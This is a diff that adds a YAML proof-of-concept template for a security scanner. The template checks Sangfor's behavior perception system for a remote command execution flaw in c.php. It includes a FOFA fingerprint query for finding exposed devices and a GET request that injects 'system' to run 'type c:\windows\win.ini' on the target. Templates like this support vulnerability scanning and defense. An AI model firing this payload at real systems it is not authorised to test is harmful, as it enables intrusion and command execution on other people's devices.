@@ -1,0 +1,16 @@
+id: poc-yaml-sangfor-behavioral-perception-system-c-php-rce
+info:
+  name: 深信服 行为感知系统 c.php 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 深信服 行为感知系统
+  fofa: body="isHighPerformance" && body="!!SFIsHighPerformance,"
+requests:
+- method: GET
+  path: /tool/log/c.php?strip_slashes=system&host=type%20c:\windows\win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && contains(body,"Host") && contains(body,"Log Helper")
+variables: {}
+transport: http
